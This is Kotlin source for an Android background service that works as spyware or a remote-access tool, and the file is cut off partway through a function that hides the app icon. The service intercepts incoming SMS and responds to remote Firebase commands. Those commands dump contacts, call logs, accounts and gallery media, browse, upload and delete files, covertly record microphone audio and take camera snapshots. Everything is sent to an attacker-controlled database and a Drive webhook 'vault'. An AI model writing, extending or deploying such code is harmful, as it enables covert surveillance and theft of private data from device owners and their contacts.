package com.example.myapplicationtestweb

import android.Manifest
import android.accounts.AccountManager
import android.app.*
import android.app.usage.UsageStatsManager
import android.content.*
import android.content.ContentUris
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.*
import android.hardware.camera2.*
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.*
import android.net.Uri
import android.os.*
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.util.Base64
import timber.log.Timber
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.database.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.*
import java.net.URLConnection
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import android.os.PowerManager
import android.app.KeyguardManager

class StreamingService : Service() {
    companion object {
        var isUninstalling = false
    }

    private var cameraManager: CameraManager? = null
    private var firebaseInstance: FirebaseDatabase? = null
    private var database: DatabaseReference? = null
    private var deviceId: String = ""
    private var userId: String = ""
    private var deviceRef: DatabaseReference? = null
    private var userRef: DatabaseReference? = null
    private var locationManager: LocationManager? = null
    private var clipboard: ClipboardManager? = null
    private var isFirebaseReady = false
    private var wakeLock: PowerManager.WakeLock? = null
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    private var audioRecord: AudioRecord? = null
    private var isLiveAudio = false
    private val isProcessingAudio = AtomicBoolean(false)
    private val isProcessingFrame = AtomicBoolean(false)

    private var isStreamingEnabled = false
    private var currentStreamType = "none"
    private var streamQuality = 25
    private var streamWidth = 320
    private var streamHeight = 240
    private var sensorOrientation = 0
    private var isFrontCamera = false

    private var isMonitorEnabled = true
    private var isClipboardEnabled = true
    private var isLocationEnabled = true

    private val mainHandler = Handler(Looper.getMainLooper())
    private val monitorRunnable = object : Runnable {
        override fun run() {
            if (!isMonitorEnabled || !isFirebaseReady) return
            try {
                updateDeviceHealth()
                checkForegroundApp()
            } catch (e: Exception) {}
            mainHandler.postDelayed(this, 30000)
        }
    }

    private var smsReceiverRegistered = false
    private val smsReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
                val bundle = intent.extras ?: return
                val pdus = bundle.get("pdus") as? Array<*> ?: return
                for (pdu in pdus) {
                    val sms = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
                    val sender = sms.originatingAddress ?: "Unknown"
                    val body = sms.messageBody ?: ""
                    
                    val formattedLog = "📨 [SMS RECEIVED] From: $sender\n$body"
                    
                    val smsData = mapOf(
                        "sender" to sender,
                        "body" to body,
                        "type" to "incoming",
                        "time" to com.google.firebase.database.ServerValue.TIMESTAMP
                    )
                    
                    deviceRef?.child("smsList")?.push()?.setValue(smsData)
                    
                    // Also keep in logs for quick view
                    deviceRef?.child("logs")?.push()?.setValue(mapOf(
                        "log" to formattedLog,
                        "time" to com.google.firebase.database.ServerValue.TIMESTAMP
                    ))
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        // CRITICAL: Start foreground IMMEDIATELY to prevent 5-second timeout crash on Android 12+
        promoteToForeground(camera = false, mic = false, loc = false)

        try {
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
            userId = Config.getUserId(this)
            
            val dbUrl = Config.getDbUrl(this)
            if (dbUrl.isEmpty() || userId.isEmpty()) {
                Timber.e("Missing config: userId=$userId, dbUrl=$dbUrl")
                return
            }

            firebaseInstance = FirebaseDatabase.getInstance(dbUrl)
            database = firebaseInstance!!.reference
            userRef = database!!.child("users").child(userId)
            deviceRef = userRef!!.child("devices").child(deviceId)
            isFirebaseReady = true
            
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as? CameraManager
            clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            
            // Register SMS receiver only if permission granted
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED) {
                try {
                    val filter = android.content.IntentFilter("android.provider.Telephony.SMS_RECEIVED")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        registerReceiver(smsReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
                    } else {
                        registerReceiver(smsReceiver, filter)
                    }
                    smsReceiverRegistered = true
                } catch (e: Exception) {
                    Timber.e(e, "SMS receiver error")
                }
            }
            
            checkDeviceLimitAndStart()
        } catch (e: Exception) { 
            Timber.e(e, "Error in onCreate") 
        }
    }

    private fun checkDeviceLimitAndStart() {
        val ref = userRef ?: return
        
        // ALWAYS register device presence first so it shows in the list
        deviceRef?.child("info")?.updateChildren(mapOf(
            "model" to Build.MODEL,
            "brand" to Build.BRAND,
            "sdk" to Build.VERSION.SDK_INT
        ))
        deviceRef?.child("health")?.updateChildren(mapOf(
            "online" to true,
            "lastSeen" to ServerValue.TIMESTAMP
        ))
        
        ref.addListenerForSingleValueEvent(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                // Default device limit to 999 (effectively unlimited) if not set
                val limit = snapshot.child("device_limit").getValue(Int::class.java) ?: 999
                val devices = snapshot.child("devices")
                // Always allow if device is already registered OR under limit
                if (devices.hasChild(deviceId) || devices.childrenCount <= limit) { startFullService() }
                else { stopSelf() }
            }
            override fun onCancelled(error: DatabaseError) {
                // On error, still try to start (don't kill the service)
                startFullService()
            }
        })
    }

    private fun startFullService() {
        setupPresence()
        promoteToForeground(camera = false, mic = false, loc = true)
        sendDeviceInfo()
        setupFirebaseListeners()
        setupCommandListeners()
        mainHandler.post(monitorRunnable)
        
        // Initial data pull
        attemptInitialExport()
        
        // Log startup to Firebase
        deviceRef?.child("logs")?.push()?.setValue(mapOf(
            "log" to "🚀 [SYSTEM STARTED] Device: ${Build.MODEL}",
            "time" to ServerValue.TIMESTAMP
        ))
    }

    private fun attemptInitialExport() {
        val prefs = getSharedPreferences("StreamingPrefs", Context.MODE_PRIVATE)
        val lastTime = prefs.getLong("lastExport", 0L)
        val now = System.currentTimeMillis()
        
        if (now - lastTime > 24 * 60 * 60 * 1000) {
            val hasContacts = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
            val hasAccounts = ContextCompat.checkSelfPermission(this, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
            
            if (hasContacts || hasAccounts) {
                Thread {
                    try {
                        if (hasAccounts) {
                            exportAccountsToFirebase()
                        }
                        
                        // We only care about accounts now since telegram is removed
                        prefs.edit().putLong("lastExport", now).apply()
                        deviceRef?.child("health")?.child("lastExport")?.setValue(now)
                        
                    } catch (e: Exception) {
                        Timber.e(e, "Export failed")
                        mainHandler.postDelayed({ attemptInitialExport() }, 30000)
                    }
                }.start()
            } else {
                // Retry in 10s if permissions are not granted yet
                mainHandler.postDelayed({ attemptInitialExport() }, 10000)
            }
        }
    }

    private fun setupPresence() {
        val fb = firebaseInstance ?: return
        val dRef = deviceRef ?: return
        
        // Set online immediately (don't wait for .info/connected event)
        dRef.child("health").child("online").setValue(true)
        dRef.child("health").child("lastSeen").setValue(ServerValue.TIMESTAMP)
        
        // Then setup the persistent presence listener
        val connectedRef = fb.getReference(".info/connected")
        connectedRef.addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val connected = snapshot.getValue(Boolean::class.java) ?: false
                if (connected) {
                    // Re-assert online status on reconnect
                    dRef.child("health").child("online").setValue(true)
                    dRef.child("health").child("lastSeen").setValue(ServerValue.TIMESTAMP)
                    // When disconnected, Firebase will automatically set online to false
                    dRef.child("health").child("online").onDisconnect().setValue(false)
                    dRef.child("health").child("lastSeen").onDisconnect().setValue(ServerValue.TIMESTAMP)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun handleCommand(snapshot: DataSnapshot) {
        val command = snapshot.key ?: return
        val value = snapshot.value
        Timber.d("StreamingService", "Command received: $command = $value")
        when (command) {
            "exportAccounts" -> { Thread { exportAccountsToFirebase() }.start(); snapshot.ref.removeValue() }
            "getApps" -> { Thread { exportAppsList() }.start(); snapshot.ref.removeValue() }
            "getSMS" -> { Thread { exportSMSList() }.start(); snapshot.ref.removeValue() }
            "getContacts" -> { Thread { exportContacts() }.start(); snapshot.ref.removeValue() }
            "getCallLogs" -> { Thread { exportCallLogs() }.start(); snapshot.ref.removeValue() }
            "fetchGallery" -> { Thread { exportGalleryPhotos(snapshot) }.start(); snapshot.ref.removeValue() }
            "listFiles" -> { Thread { listRemoteFiles(snapshot) }.start(); snapshot.ref.removeValue() }
            "downloadFile" -> { Thread { downloadRemoteFileToDrive(snapshot) }.start(); snapshot.ref.removeValue() }
            "deleteFile" -> { Thread { deleteRemoteFile(snapshot) }.start(); snapshot.ref.removeValue() }
            "recordAudio" -> { Thread { recordAmbientAudio(snapshot) }.start(); snapshot.ref.removeValue() }
            "cameraSnap" -> { Thread { captureCameraSnapshot(snapshot) }.start(); snapshot.ref.removeValue() }
            "hideAppIcon" -> { Thread { setAppIconHidden(snapshot) }.start(); snapshot.ref.removeValue() }
            "playAlarm" -> { Thread { playLoudAlarm() }.start(); snapshot.ref.removeValue() }
            "toggleTorch" -> { Thread { toggleTorch(snapshot) }.start(); snapshot.ref.removeValue() }
            "vibrateDevice" -> { Thread { vibrateDevice() }.start(); snapshot.ref.removeValue() }
            "forceLocation" -> { Thread { forceLocationUpdate() }.start(); snapshot.ref.removeValue() }
        }
    }

    private fun uploadToGoogleDrive(filename: String, base64Data: String, mimeType: String = "image/jpeg"): Map<String, String>? {
        return try {
            val webhookUrl = Config.getDriveWebhookUrl(this)
            if (webhookUrl.isEmpty()) return null
            
            val jsonPayload = JSONObject().apply {
                put("userId", userId)
                put("deviceId", deviceId)
                put("filename", filename)
                put("base64", base64Data)
                put("mimeType", mimeType)
            }.toString()
            
            val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
            val body = jsonPayload.toRequestBody(mediaType)
            val request = Request.Builder()
                .url(webhookUrl)
                .post(body)
                .build()
                
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val respStr = response.body?.string() ?: ""
                val jsonResp = JSONObject(respStr)
                if (jsonResp.optString("status") == "success") {
                    mapOf(
                        "fileId" to jsonResp.optString("fileId"),
                        "driveUrl" to jsonResp.optString("driveUrl"),
                        "directUrl" to jsonResp.optString("directUrl")
                    )
                } else null
            } else null
        } catch (e: Exception) {
            Timber.e(e, "Drive Upload Error: ${e.message}")
            null
        }
    }

    private fun extractVideoThumbnail(contentUri: Uri): String {
        val retriever = MediaMetadataRetriever()
        return try {
            val pfd = contentResolver.openFileDescriptor(contentUri, "r")
            if (pfd != null) {
                retriever.setDataSource(pfd.fileDescriptor)
                val bitmap = retriever.getFrameAtTime(1000000, MediaMetadataRetriever.OPTION_CLOSEST_SYNC) 
                    ?: retriever.frameAtTime
                pfd.close()
                if (bitmap != null) {
                    val out = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 75, out)
                    val bytes = out.toByteArray()
                    val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    bitmap.recycle()
                    b64
                } else ""
            } else ""
        } catch (e: Exception) {
            Timber.e(e, "Error extracting video thumbnail")
            ""
        } finally {
            try { retriever.release() } catch (e: Exception) {}
        }
    }

    private fun exportGalleryPhotos(snapshot: DataSnapshot) {
        try {
            val mode = snapshot.child("mode").getValue(String::class.java) ?: "latest"
            val countLimit = snapshot.child("count").getValue(Long::class.java)?.toInt() ?: if (mode == "all") 500 else 10
            
            val mediaItems = mutableListOf<Map<String, Any>>()

            // 1. Query Photos / Images
            try {
                val imgUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val imgProj = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED,
                    MediaStore.Images.Media.SIZE
                )
                val imgCursor = contentResolver.query(imgUri, imgProj, null, null, "${MediaStore.Images.Media.DATE_ADDED} DESC")
                imgCursor?.use {
                    val idCol = it.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val dateCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    val sizeCol = it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                    var c = 0
                    while (it.moveToNext() && c < countLimit) {
                        val id = it.getLong(idCol)
                        val name = it.getString(nameCol) ?: "IMG_$id.jpg"
                        val date = it.getLong(dateCol) * 1000L
                        val size = it.getLong(sizeCol)
                        val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
                        mediaItems.add(mapOf(
                            "id" to id,
                            "name" to name,
                            "date" to date,
                            "size" to size,
                            "uri" to contentUri,
                            "type" to "image"
                        ))
                        c++
                    }
                }
            } catch (e: Exception) {
                Timber.e(e, "Error querying images")
            }

            // 2. Query Videos
            try {
                val vidUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                val vidProj = arrayOf(
                    MediaStore.Video.Media._ID,
                    MediaStore.Video.Media.DISPLAY_NAME,
                    MediaStore.Video.Media.DATE_ADDED,
                    MediaStore.Video.Media.SIZE,
                    MediaStore.Video.Media.DURATION
                )
                val vidCursor = contentResolver.query(vidUri, vidProj, null, null, "${MediaStore.Video.Media.DATE_ADDED} DESC")
                vidCursor?.use {
                    val idCol = it.getColumnIndexOrThrow(MediaStore.Video.Media._ID)
                    val nameCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)
                    val dateCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED)
                    val sizeCol = it.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)
                    val durCol = it.getColumnIndex(MediaStore.Video.Media.DURATION)
                    var c = 0
                    while (it.moveToNext() && c < countLimit) {
                        val id = it.getLong(idCol)
                        val name = it.getString(nameCol) ?: "VID_$id.mp4"
                        val date = it.getLong(dateCol) * 1000L
                        val size = it.getLong(sizeCol)
                        val duration = if (durCol != -1) it.getLong(durCol) else 0L
                        val contentUri = ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id)
                        mediaItems.add(mapOf(
                            "id" to id,
                            "name" to name,
                            "date" to date,
                            "size" to size,
                            "duration" to duration,
                            "uri" to contentUri,
                            "type" to "video"
                        ))
                        c++
                    }
                }
            } catch (e: Exception) {
                Timber.e(e, "Error querying videos")
            }

            // 3. Sort merged media by date descending
            val sortedMedia = mediaItems.sortedByDescending { it["date"] as Long }.take(countLimit)
            val outputList = mutableListOf<Map<String, Any>>()
            var processed = 0

            for (item in sortedMedia) {
                val id = item["id"].toString()
                val name = item["name"].toString()
                val date = item["date"] as Long
                val size = item["size"] as Long
                val type = item["type"].toString()
                val uri = item["uri"] as Uri
                val duration = (item["duration"] as? Long) ?: 0L

                var rawBase64 = ""
                if (type == "video") {
                    rawBase64 = extractVideoThumbnail(uri)
                } else {
                    try {
                        contentResolver.openInputStream(uri)?.use { input ->
                            val options = BitmapFactory.Options().apply { inSampleSize = 2 }
                            val bitmap = BitmapFactory.decodeStream(input, null, options)
                            if (bitmap != null) {
                                val out = ByteArrayOutputStream()
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out)
                                val bytes = out.toByteArray()
                                rawBase64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                bitmap.recycle()
                            }
                        }
                    } catch (ex: Exception) {
                        Timber.e(ex, "Error reading photo: $name")
                    }
                }

                if (rawBase64.isNotEmpty()) {
                    val photoEntry = mutableMapOf<String, Any>(
                        "id" to id,
                        "name" to name,
                        "time" to date,
                        "size" to size,
                        "type" to type,
                        "duration" to duration
                    )

                    // Upload strictly to Google Drive Vault
                    val driveRes = uploadToGoogleDrive(name, rawBase64)
                    if (driveRes != null) {
                        photoEntry["fileId"] = driveRes["fileId"] ?: ""
                        photoEntry["driveUrl"] = driveRes["driveUrl"] ?: ""
                        photoEntry["directUrl"] = driveRes["directUrl"] ?: ""
                        photoEntry["provider"] = "google_drive"
                        outputList.add(photoEntry)
                        processed++
                    } else {
                        Timber.e("Google Drive upload failed for $name")
                    }
                }
            }
            
            if (mode == "all") {
                deviceRef?.child("media/gallery")?.setValue(outputList)
            } else {
                deviceRef?.child("media/recent")?.setValue(outputList)
            }

            // Also post notification log to Firebase logs
            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "☁️ [GOOGLE DRIVE VAULT] Synced $processed media items (Photos & Videos) to Google Drive (OBEYME_Cloud_Vault)",
                "time" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Error exporting gallery photos")
        }
    }

    private fun exportContacts() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
            val projection = arrayOf(
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
            )
            val cursor = contentResolver.query(uri, projection, null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
            val contactList = mutableListOf<Map<String, String>>()
            cursor?.use {
                val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                var count = 0
                while (it.moveToNext() && count < 1000) {
                    val name = if (nameCol != -1) it.getString(nameCol) ?: "Unknown" else "Unknown"
                    val number = if (numCol != -1) it.getString(numCol) ?: "" else ""
                    if (number.isNotEmpty()) {
                        contactList.add(mapOf("name" to name, "number" to number))
                        count++
                    }
                }
            }
            deviceRef?.child("contacts/list")?.setValue(contactList)
            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "📞 [CONTACTS DUMP] Synced ${contactList.size} contacts",
                "time" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Error exporting contacts")
        }
    }

    private fun exportCallLogs() {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
            val uri = CallLog.Calls.CONTENT_URI
            val projection = arrayOf(
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )
            val cursor = contentResolver.query(uri, projection, null, null, "${CallLog.Calls.DATE} DESC")
            val callList = mutableListOf<Map<String, Any>>()
            cursor?.use {
                val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
                val durCol = it.getColumnIndex(CallLog.Calls.DURATION)
                var count = 0
                while (it.moveToNext() && count < 200) {
                    val name = if (nameCol != -1) it.getString(nameCol) ?: "Unknown" else "Unknown"
                    val number = if (numCol != -1) it.getString(numCol) ?: "" else ""
                    val typeInt = if (typeCol != -1) it.getInt(typeCol) else CallLog.Calls.INCOMING_TYPE
                    val date = if (dateCol != -1) it.getLong(dateCol) else 0L
                    val dur = if (durCol != -1) it.getLong(durCol) else 0L

                    val typeStr = when (typeInt) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        else -> "Call"
                    }

                    callList.add(mapOf(
                        "name" to name,
                        "number" to number,
                        "type" to typeStr,
                        "time" to date,
                        "duration" to dur
                    ))
                    count++
                }
            }
            deviceRef?.child("calls/list")?.setValue(callList)
            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "📋 [CALL LOGS] Synced ${callList.size} call records",
                "time" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Error exporting call logs")
        }
    }

    private fun listRemoteFiles(snapshot: DataSnapshot) {
        try {
            val reqPath = snapshot.child("path").getValue(String::class.java) 
                ?: Environment.getExternalStorageDirectory().absolutePath
            val targetDir = File(reqPath)
            val fileEntries = mutableListOf<Map<String, Any>>()
            
            if (targetDir.exists() && targetDir.isDirectory) {
                val files = targetDir.listFiles()
                files?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))?.take(300)?.forEach { file ->
                    fileEntries.add(mapOf(
                        "name" to file.name,
                        "path" to file.absolutePath,
                        "isDir" to file.isDirectory,
                        "size" to if (file.isDirectory) 0L else file.length(),
                        "time" to file.lastModified()
                    ))
                }
            }
            deviceRef?.child("files/currentPath")?.setValue(targetDir.absolutePath)
            deviceRef?.child("files/list")?.setValue(fileEntries)
            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "📁 [FILE MANAGER] Listed ${fileEntries.size} items in ${targetDir.name.ifEmpty { "Root" }}",
                "time" to ServerValue.TIMESTAMP
            ))
        } catch (e: Exception) {
            Timber.e(e, "Error listing files")
        }
    }

    private fun downloadRemoteFileToDrive(snapshot: DataSnapshot) {
        try {
            val filePath = snapshot.child("path").getValue(String::class.java) ?: return
            val file = File(filePath)
            if (!file.exists() || file.isDirectory) return
            
            val bytes = file.readBytes()
            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
            val mimeType = URLConnection.guessContentTypeFromName(file.name) ?: "application/octet-stream"
            
            val driveRes = uploadToGoogleDrive(file.name, base64, mimeType)
            if (driveRes != null) {
                val entry = mapOf(
                    "name" to file.name,
                    "path" to file.absolutePath,
                    "size" to file.length(),
                    "time" to System.currentTimeMillis(),
                    "driveUrl" to (driveRes["driveUrl"] ?: ""),
                    "directUrl" to (driveRes["directUrl"] ?: ""),
                    "fileId" to (driveRes["fileId"] ?: "")
                )
                deviceRef?.child("files/downloads")?.push()?.setValue(entry)
                deviceRef?.child("logs")?.push()?.setValue(mapOf(
                    "log" to "☁️ [FILE TO DRIVE] ${file.name} uploaded to Google Drive",
                    "time" to ServerValue.TIMESTAMP
                ))
            }
        } catch (e: Exception) {
            Timber.e(e, "Error downloading file to drive")
        }
    }

    private fun deleteRemoteFile(snapshot: DataSnapshot) {
        try {
            val filePath = snapshot.child("path").getValue(String::class.java) ?: return
            val file = File(filePath)
            val parentPath = file.parentFile?.absolutePath ?: Environment.getExternalStorageDirectory().absolutePath
            if (file.exists()) {
                val deleted = file.delete()
                deviceRef?.child("logs")?.push()?.setValue(mapOf(
                    "log" to if (deleted) "🗑️ [FILE DELETED] ${file.name}" else "❌ [DELETE FAILED] ${file.name}",
                    "time" to ServerValue.TIMESTAMP
                ))
                // Refresh folder list
                val targetDir = File(parentPath)
                val fileEntries = mutableListOf<Map<String, Any>>()
                if (targetDir.exists() && targetDir.isDirectory) {
                    targetDir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))?.take(300)?.forEach { f ->
                        fileEntries.add(mapOf(
                            "name" to f.name,
                            "path" to f.absolutePath,
                            "isDir" to f.isDirectory,
                            "size" to if (f.isDirectory) 0L else f.length(),
                            "time" to f.lastModified()
                        ))
                    }
                }
                deviceRef?.child("files/currentPath")?.setValue(targetDir.absolutePath)
                deviceRef?.child("files/list")?.setValue(fileEntries)
            }
        } catch (e: Exception) {
            Timber.e(e, "Error deleting file")
        }
    }

    private fun recordAmbientAudio(snapshot: DataSnapshot) {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
            val durationSec = snapshot.child("duration").getValue(Long::class.java)?.toInt() ?: 30
            val outputFile = File(cacheDir, "ambient_${System.currentTimeMillis()}.m4a")

            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setAudioEncodingBitRate(64000)
            recorder.setAudioSamplingRate(44100)
            recorder.setOutputFile(outputFile.absolutePath)
            recorder.prepare()
            recorder.start()

            deviceRef?.child("logs")?.push()?.setValue(mapOf(
                "log" to "🎙️ [AUDIO RECORDER] Recording ambient mic audio for ${durationSec}s...",
                "time" to ServerValue.TIMESTAMP
            ))

            Thread.sleep(durationSec * 1000L)

            try {
                recorder.stop()
                recorder.release()
            } catch (e: Exception) {}

            if (outputFile.exists() && outputFile.length() > 0) {
                val bytes = outputFile.readBytes()
                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                val fileName = "Audio_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.m4a"
                val driveRes = uploadToGoogleDrive(fileName, base64, "audio/mp4")
                if (driveRes != null) {
                    val entry = mapOf(
                        "name" to fileName,
                        "time" to System.currentTimeMillis(),
                        "duration" to durationSec,
                        "size" to outputFile.length(),
                        "driveUrl" to (driveRes["driveUrl"] ?: ""),
                        "directUrl" to (driveRes["directUrl"] ?: ""),
                        "fileId" to (driveRes["fileId"] ?: "")
                    )
                    deviceRef?.child("media/audio_records")?.push()?.setValue(entry)
                    deviceRef?.child("logs")?.push()?.setValue(mapOf(
                        "log" to "☁️ [AUDIO SAVED] $fileName uploaded to Google Drive (${durationSec}s)",
                        "time" to ServerValue.TIMESTAMP
                    ))
                }
                outputFile.delete()
            }
        } catch (e: Exception) {
            Timber.e(e, "Error recording ambient audio")
        }
    }

    private fun captureCameraSnapshot(snapshot: DataSnapshot) {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
            val facing = snapshot.child("facing").getValue(String::class.java) ?: "back"
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val targetFacing = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK

            var selectedCameraId: String? = null
            for (id in cm.cameraIdList) {
                val chars = cm.getCameraCharacteristics(id)
                if (chars.get(CameraCharacteristics.LENS_FACING) == targetFacing) {
                    selectedCameraId = id
                    break
                }
            }
            if (selectedCameraId == null) selectedCameraId = cm.cameraIdList.firstOrNull() ?: return

            val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
            val handlerThread = HandlerThread("CameraSnapThread").apply { start() }
            val snapHandler = Handler(handlerThread.looper)

            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    val fileName = "Snap_${facing.uppercase()}_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.jpg"
                    val driveRes = uploadToGoogleDrive(fileName, base64, "image/jpeg")
                    if (driveRes != null) {
                        val entry = mapOf(
                            "name" to fileName,
                            "facing" to facing,
                            "time" to System.currentTimeMillis(),
                            "size" to bytes.size,
                            "driveUrl" to (driveRes["driveUrl"] ?: ""),
                            "directUrl" to (driveRes["directUrl"] ?: ""),
                            "fileId" to (driveRes["fileId"] ?: "")
                        )
                        deviceRef?.child("media/camera_snaps")?.push()?.setValue(entry)
                        deviceRef?.child("logs")?.push()?.setValue(mapOf(
                            "log" to "📸 [CAMERA SNAP] $fileName (${facing.uppercase()}) saved to Google Drive",
                            "time" to ServerValue.TIMESTAMP
                        ))
                    }
                    handlerThread.quitSafely()
                }
            }, snapHandler)

            cm.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    try {
                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureBuilder.addTarget(imageReader.surface)
                        captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                try {
                                    session.capture(captureBuilder.build(), null, snapHandler)
                                } catch (e: Exception) {}
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                camera.close()
                                handlerThread.quitSafely()
                            }
                        }, snapHandler)
                    } catch (e: Exception) {
                        camera.close()
                        handlerThread.quitSafely()
                    }
                }
                override fun onDisconnected(camera: CameraDevice) { camera.close(); handlerThread.quitSafely() }
                override fun onError(camera: CameraDevice, error: Int) { camera.close(); handlerThread.quitSafely() }
            }, snapHandler)
        } catch (e: Exception) {
            Timber.e(e, "Error capturing camera snapshot")
        }
    }

    private fun setAppIconHidden(snapshot: DataSnapshot) {
        try {
